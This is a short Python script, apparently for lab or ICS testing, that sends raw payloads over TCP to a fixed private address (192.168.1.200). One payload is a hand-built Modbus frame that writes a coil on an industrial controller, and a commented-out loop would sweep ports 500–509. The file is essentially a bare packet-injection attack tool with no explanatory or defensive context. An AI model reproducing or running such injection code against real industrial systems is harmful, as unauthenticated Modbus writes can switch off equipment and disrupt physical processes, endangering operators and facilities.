#from scapy import all as scapy
#import pymodbus
import socket
import time
import sys

def inject (payload, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	print(payload)
	print(port)

	s.connect (('192.168.1.200', port))

	s.send(payload)

	res = s.recv(900) # buffer
		
	s.close()
	print('########')
	print(port)
	print(res)



payload = [b"\x00", b'\x00\x3c\x00\x00\x00\x06\x01\x05\x00\xa1\x00\x00',  b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"]

inject(payload[int(sys.argv[2])], int(sys.argv[1]))

#for port in range(500,510):
	#print(port)
	#print('---')
	#inject(payload, port)
	#time.sleep(1)







